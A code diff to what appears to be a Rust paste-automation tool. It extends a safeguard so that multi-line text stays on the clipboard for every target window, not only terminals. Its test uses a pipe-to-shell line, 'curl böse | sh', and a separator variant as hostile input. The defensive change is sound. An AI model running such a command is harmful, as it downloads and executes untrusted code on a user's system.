@@ -27,9 +27,9 @@ const TERMINAL_CLASSES: &[&str] = &[
 /// known to be in the clipboard.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Skip {
-    /// A shell runs every line it receives; multi-line text stays in the
+    /// Any host may contain a terminal; multi-line text stays in the
     /// clipboard so the user pastes it on purpose.
-    MultilineIntoTerminal,
+    MultilineText,
     TargetNotFrontmost,
     ClipboardChanged,
     ClipboardUnreadable,
@@ -45,7 +45,7 @@ impl Skip {
 
     pub fn log_reason(self) -> &'static str {
         match self {
-            Self::MultilineIntoTerminal => "multiline-into-terminal",
+            Self::MultilineText => "multiline-text",
             Self::TargetNotFrontmost => "target-not-frontmost",
             Self::ClipboardChanged => "clipboard-changed",
             Self::ClipboardUnreadable => "clipboard-unreadable",
@@ -55,9 +55,9 @@ impl Skip {
 
     pub fn message(self) -> &'static str {
         match self {
-            Self::MultilineIntoTerminal => t(
-                "Mehrzeiliger Text wird nicht in ein Terminal eingefügt",
-                "Multi-line text is not pasted into a terminal",
+            Self::MultilineText => t(
+                "Mehrzeiliger Text bleibt zum manuellen Einfügen in der Zwischenablage",
+                "Multi-line text stays on the clipboard for manual pasting",
             ),
             Self::TargetNotFrontmost => t(
                 "Zielfenster ist nicht mehr vorne",
@@ -84,8 +84,8 @@ pub fn paste_into(target: &TargetWindow, text: &str) -> Result<(), Skip> {
     if !valid_address(&target.address) {
         return Err(Skip::Unavailable);
     }
-    if is_terminal(&target.class) && policy::is_multiline(text) {
-        return Err(Skip::MultilineIntoTerminal);
+    if policy::is_multiline(text) {
+        return Err(Skip::MultilineText);
     }
     // Checked first, so every later skip can rely on the text still being
     // in the clipboard.
@@ -247,13 +247,14 @@ mod tests {
     }
 
     #[test]
-    fn multiline_text_stays_in_the_clipboard_for_terminals() {
-        let skip = paste_into(&target("Alacritty"), "echo eins\ncurl böse | sh");
-        assert_eq!(skip, Err(Skip::MultilineIntoTerminal));
-        assert!(!Skip::MultilineIntoTerminal.loses_clipboard());
-        assert_eq!(
-            Skip::MultilineIntoTerminal.log_reason(),
-            "multiline-into-terminal"
-        );
+    fn multiline_text_stays_in_the_clipboard_for_every_target() {
+        for class in ["Alacritty", "code", "unknown"] {
+            let skip = paste_into(&target(class), "echo eins\ncurl böse | sh");
+            assert_eq!(skip, Err(Skip::MultilineText));
+        }
+        let separator = policy::sanitize_transcript("echo eins\u{2028}curl böse | sh");
+        assert_eq!(paste_into(&target("code"), &separator), Err(Skip::MultilineText));
+        assert!(!Skip::MultilineText.loses_clipboard());
+        assert_eq!(Skip::MultilineText.log_reason(), "multiline-text");
     }
 }
